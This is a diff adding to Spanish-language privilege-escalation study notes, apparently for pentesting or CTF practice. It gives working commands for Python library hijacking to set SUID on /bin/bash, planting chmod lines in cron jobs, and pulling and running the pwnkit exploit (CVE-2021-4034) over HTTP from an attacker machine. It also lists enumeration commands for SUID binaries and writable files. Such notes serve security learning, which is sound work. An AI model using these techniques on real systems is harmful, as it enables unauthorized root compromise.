@@ -18,7 +18,7 @@ tags:
 
 ## Usuarios en Windows.<br>
 - Invitado (Guest): Puede usar el equipo pero no modificar nada dentro de el.<br>
-- Standard: Usuario con capacidad de modificar algunas configuraciones del sistema siempre y cuando solo afecten al mismo usario.<br>
+- Standard: Usuario con capacidad de modificar algunas configuraciones del sistema siempre y cuando solo afecten al mismo usuario.<br>
 - Administrator: Usuario con capacidad de modificar el sistema, desactivar el antivirus, instalar herramientas de forma global o acceder a la información de otros usuarios dentro del mismo sistema.<br>
 - NT Authority\System: Usuario del sistema que ejecuta las tareas y servicios del sistema operativo.<br>
 Con el comando net users puedes ver los usuarios existentes en el sistema.<br><br>
@@ -138,15 +138,70 @@ bash -p
 Consiste en suplantar una librería de python que un script.py importe al ejecutarse.<br>
 ¿Como se realiza esta técnica? Lo primero que tendras que hacer es identificar un script.py que se ejecute en el sistema, abres el script.py y revisas que librerías esta importando el script.py.<br> Una vez que hallaz identificado las librerías que se importan lo que vas a hacer es crear un script.py pero con el nombre de una de las librerías que importa el script. Dentro de la librería que acabas de crear vas a añadir código malicioso que te permita cambiar los privilegios de la bash. Lo que hace el script.py al ejecutarse es que al importar las librerías sigue un orden que depende del path(secuencia de directorios que se recorren para llegar a un archivo). Por lo regular parte de la ruta actual donde se sitúa y de allí recorre los demas directorios en busca de las librerías.<br>
 Entonces si creas una archivo con el nombre de una librería que importe el script.py tomará está primero debido a que esta situada en el mismo lugar que el script.py y esta librería hará lo que tu le indiques dentro del script.<br>
-Ej; La librería que se importa en el script.py es hashlib. Lo que haces es crear un archivo hashlib.py que invoque al sistema operativo para cambiarle los privilegios a la bash a u+s. Ejecutamos el script indicando como usuario a root seguido de la ruta en la cual se encuentra el script.py.<br>
+Ej; La librería que se importa en el script.py es hashlib. Lo que haces es crear un archivo hashlib.py que invoque al sistema operativo para cambiarle los privilegios a la bash SUID(Set Uses ID). Ejecutamos el script indicando como usuario a root seguido de la ruta en la cual se encuentra el script.py.<br>
+- Los permisos SUID son permisos especiales que se le asignan a archivos o aplicaciones que al momento de ejecutarse se ejecutan como el usuario propietario y no como el usuario que lo ejecuta.<br>
+
 Haces un bash -p y te conviertes el el usuario root.
 ```
 nvim hashlib.py -> import os 
-		   os.system('chmod u+s "/bin/bash"')
+		   os.system('chmod u+s "/bin/bash"') 	# Tambien se puede asignar sl permiso SUID asi chmod 4755 /bin/bash 
 
 sudo -u root /usr/bin/python /home/<username>/script.py
 bash -p
 ```
+<br>
+## cat /etc/crontab | crontab -l.
+Con este comando puedes ver las tareas cron programadas en el sistema y posteriormente aprovecharte de una de ellas para injectar código malicioso. <br>
+Las tareas cron por lo regular llegar a ser scripts relacionados con correos, bases de datos o comprobación de rutinas programadas con presición para que se ejecuten en una determinada fecha y hora.<br>
+Uno como atacante puede ver las que tareas estan por ejecutarse y modificarlas agregando una linea que en el script que al ejecutarse le cambie los permisos a la bash por SUID.
+```
+chmod u+s /bin/bash
+chmod 4755 /bin/bash
+watch -c 1 /bin/bash 	# Comando para monitorizar el cambio de permisos en la bash
+```
+<br>
+## find \\-perm -4000 -user root -ls 2>/dev/null.
+Listar aquellos binarios SUID de los cuales el proprietario sea el usuario root y los errores los rediriges al stderr para no verlos en pantalla.<br>
+- ./usr/bin/pkexec (CVE-2021-4034).<br>Con este binario puedes llegar a escalar privilegios con la herramienta pwnkit que se encuentra en github.<br>Lo primero que se tiene que hacer es ver si la maquina víctima cuenta con wget y make. Posteriormente clonas te repositorio de github y lo descomprimes.<br>Desde tu maquina de atacante te compartes un servicio HTTP por el puerto 80 para transferir el pwnkit. Por ultimo te transfieres el pwnkit, ingresas en el, haces un make y lo ejecutas. Al ejecutarlo ganas acceso al sistema como el usuario root.
+
+
+```
+which wget && which make -> /usr/bin/wget 
+			    /usr/bin/make
+git clone https://github.com/berdav/CVE-2021-4034 
+mv CVE-2021-4034.zip pwnkit.zip && zip -r pwnkit.zip pwnkit
+sudo python3 -m http.server 80
+
+wget http://<ip-address>/pwnkit
+cd pwnkit && make && ./pwnkit
+```
+- ./usr/local/bin/backup.<br>Ver el propietario y el grupo al cual pertenece el binario backup. En caso de que el binario pertenezca a otros grupos puedes verificar que usuario esta en ese grupo para poder ejecutar el binario.<br>
+
+
+```
+ls -la ./usr/local/bin/backup -> -rwsr-xr-- 1 root admin 16484 Sep  3  2017 ./usr/local/bin/backup
+# En este caso el propietario es root y el grupo al que pertenece es admin, lo siguiente es ver que usuarios estan en ese
+grupo para poderlo ejecutar.
+
+groups <username> # Con este comando puedes ver los grupos a los cuales pertenece un usuario.
+```
+<br>
+## systemctl list-times.
+Ver las tareas que estan a punto de ejecutarse 
+<br>
+## getcap -r / 2>/dev/null.
+Listar las capabilities a nivel de sistema de forma recursiva y los errores redirigirlos al stderr para no verlos en pantalla.
+<br>
+## ps -faux | ps -e command.
+Listar los procesos que se estan ejecutando.
+<br>
+## find / -writable -ls 2>/dev/null.
+Listar aquellos archivos que tengan capacidad de escritura para despues injectarles código malicioso.
+<br>
+## linPEAS.sh.
+
+
+
 
 
 
